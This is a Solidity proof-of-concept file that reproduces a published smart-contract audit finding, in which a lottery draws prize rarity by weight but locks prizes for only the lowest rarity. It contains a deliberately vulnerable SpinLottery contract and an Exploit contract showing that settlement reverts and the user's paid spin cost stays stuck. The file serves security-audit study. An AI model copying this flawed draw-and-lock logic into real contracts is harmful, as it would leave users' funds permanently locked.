// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62540 (H-03):
// "Prize locking mechanism inconsistency with weight proportions".
//
// Real audited source (Pashov Audit Group, RipIt security review 2025-04-25).
// The two embedded ```solidity snippets in the finding ARE the verbatim source
// (quoted from the audited SpinLottery contract):
//   contract SpinLottery
//   fns     calculateSpinCost(...)  and  determineRarity(uint256)
//   report  github.com/pashov/audits .../RipIt-security-review_2025-04-25.md
//
// Root cause: users pay for a spin using a WEIGHT-based cost (`calculateSpinCost`),
// and the winning rarity is drawn WEIGHT-proportionally (`determineRarity`, which
// iterates cumulative weights and can land on ANY active rarity). But the prize
// LOCK mechanism does NOT follow the weight distribution: with `prizeCount = 1`
// it locks prizes as `1:0:0` — only the lowest rarity is backed. `determineRarity`
// can still return a HIGHER rarity that has NO locked prize, so the VRF callback
// `fulfillRandomness` reverts and the spin can never settle: the user's paid
// spin cost is permanently stuck.
//
// The vulnerable line marked @> is inside the VERBATIM `determineRarity`: the
// cumulative-weight walk returns a rarity independent of what the lock mechanism
// actually reserved. Non-vulnerable dependencies (rarity setup, the buggy
// weight-agnostic lock, and the VRF settlement) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double used to record the concrete harm
///      magnitude (the user's stuck spin cost) on-chain.
contract MarkerToken {
    string public name = "RipIt Stuck Prize";
    string public symbol = "rSTUCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `calculateSpinCost` and `determineRarity` are reproduced
// VERBATIM from the audited SpinLottery source.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLottery {
    struct RarityConfig {
        bool active;
        uint128 basePrice;
        uint256 weight;
    }

    uint8 public maxRarityId;
    uint256 public totalRarityWeight;
    mapping(uint8 => RarityConfig) public rarityConfigs;

    // faithful double: number of prizes actually locked per rarity id
    mapping(uint8 => uint256) public lockedPrizes;

    error InvalidSlotConfiguration();
    error InvalidWeightConfiguration();

    // ── faithful admin double: registers a rarity and maintains totalRarityWeight ──
    function setRarity(uint8 id, bool active, uint128 basePrice, uint256 weight) external {
        RarityConfig memory prev = rarityConfigs[id];
        if (prev.active) totalRarityWeight -= prev.weight;
        rarityConfigs[id] = RarityConfig(active, basePrice, weight);
        if (active) totalRarityWeight += weight;
        if (id > maxRarityId) maxRarityId = id;
    }

    // ── VERBATIM from the audited source ──
    function calculateSpinCost(uint256 _totalSlots, uint256 _prizeCount) public view returns (uint256) {
        if (_totalSlots == 0 || _prizeCount == 0 || _prizeCount > _totalSlots) {
            revert InvalidSlotConfiguration();
        }

        uint256 totalWeightedPrice = 0;

        // Calculate weighted average price across all active rarities
        for (uint8 i = 1; i <= maxRarityId; i++) {
            RarityConfig memory config = rarityConfigs[i];
            if (config.active) {
                totalWeightedPrice += uint256(config.basePrice) * config.weight;
            }
        }

        if (totalRarityWeight == 0) revert InvalidWeightConfiguration();
        uint256 avgBasePrice = totalWeightedPrice / totalRarityWeight;

        return (avgBasePrice * _prizeCount * 1000) / (_totalSlots * 1000);
    }

    // ── VERBATIM from the audited source (the drawn rarity is weight-proportional) ──
    function determineRarity(uint256 randomValue) public view returns (uint8) {
        uint256 value = randomValue % totalRarityWeight;
        uint256 cumulativeWeight = 0;

        // Iterate through rarities to find where the random value lands
        for (uint8 i = 1; i <= maxRarityId; i++) {
            RarityConfig memory config = rarityConfigs[i];
            if (config.active) {
                cumulativeWeight += config.weight; // @> VULN: rarity is drawn by weight over ALL active rarities, but the lock mechanism does not reserve a prize for every rarity — a higher rarity with no locked prize is reachable
                if (value < cumulativeWeight) {
                    return i;
                }
            }
        }

        // Fallback to highest rarity (should not happen unless weights are misconfigured)
        return maxRarityId;
    }

    // ── faithful double of the buggy lock: ignores weight proportions. With
    //    prizeCount = 1 it reserves a prize only for rarity 1 (the `1:0:0` case
    //    described in the finding); higher rarities are left with zero. ──
    function lockPrizesForSpin(uint256 prizeCount) external {
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (i <= prizeCount) {
                lockedPrizes[i] += 1;
            }
        }
    }

    // ── faithful double of the VRF callback: draws the rarity and must award a
    //    prize that was locked for THAT rarity. If none is locked it reverts,
    //    so the spin can never settle (DoS, paid spin cost stuck). ──
    function fulfillRandomness(uint256 randomValue) external returns (uint8) {
        uint8 rarity = determineRarity(randomValue);
        require(lockedPrizes[rarity] > 0, "PrizeNotLocked");
        lockedPrizes[rarity] -= 1;
        return rarity;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: configure the finding's 80/10/10 weight split, pay the
// weight-based spin cost, lock prizes with prizeCount = 1 (=> 1:0:0), then show a
// weight-proportional VRF result landing on a higher rarity reverts settlement —
// the paid spin cost is stuck. The stuck magnitude is minted to SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MarkerToken public marker;
    SpinLottery public vuln;

    uint256 public constant TOTAL_SLOTS = 100;
    uint256 public constant PRIZE_COUNT = 1;

    // value % 100 = 85 -> cumulative 80 (rarity1) then 90 (rarity2): lands on rarity 2
    uint256 internal constant HIGH_RARITY_RANDOM = 85;
    // value % 100 = 10 -> < 80: lands on rarity 1 (the only locked rarity)
    uint256 internal constant LOW_RARITY_RANDOM = 10;

    uint256 public spinCost;      // weight-based cost the user paid
    bool public settlementReverted; // DoS proof
    uint8 public controlRarity;   // control-path settled rarity

    constructor() {
        marker = new MarkerToken(); // child nonce 1 (profit/marker token)
        vuln = new SpinLottery();   // child nonce 2 (VULN)
    }

    function run() external {
        // finding's example: weights 80% / 10% / 10% (higher rarities cost more)
        vuln.setRarity(1, true, 1e18, 80);
        vuln.setRarity(2, true, 5e18, 10);
        vuln.setRarity(3, true, 10e18, 10);

        // user pays the WEIGHT-based spin cost to enter (funds committed to the spin)
        spinCost = vuln.calculateSpinCost(TOTAL_SLOTS, PRIZE_COUNT);
        require(spinCost > 0, "zero spin cost");

        // prizes are locked WITHOUT following the weight split: prizeCount=1 -> 1:0:0
        vuln.lockPrizesForSpin(PRIZE_COUNT);
        require(vuln.lockedPrizes(1) == 1 && vuln.lockedPrizes(2) == 0 && vuln.lockedPrizes(3) == 0, "lock not 1:0:0");

        // VRF returns a weight-proportional value that determineRarity maps to a
        // HIGHER rarity (2) which has NO locked prize -> fulfillRandomness reverts.
        // The spin can never settle; the user's paid spinCost is permanently stuck.
        try vuln.fulfillRandomness(HIGH_RARITY_RANDOM) returns (uint8) {
            settlementReverted = false;
        } catch {
            settlementReverted = true;
        }
        require(settlementReverted, "no DoS: fulfillRandomness settled a higher rarity");

        // control: a value landing on rarity 1 (the only backed rarity) settles fine,
        // proving the revert is specifically the lock/weight mismatch, not generic.
        controlRarity = vuln.fulfillRandomness(LOW_RARITY_RANDOM);
        require(controlRarity == 1, "control path settled wrong rarity");

        // concrete harm magnitude: the stuck spin cost, recorded on the marker token
        marker.mint(SINK, spinCost);
        require(marker.balanceOf(SINK) == spinCost, "harm magnitude not realized");
    }
}
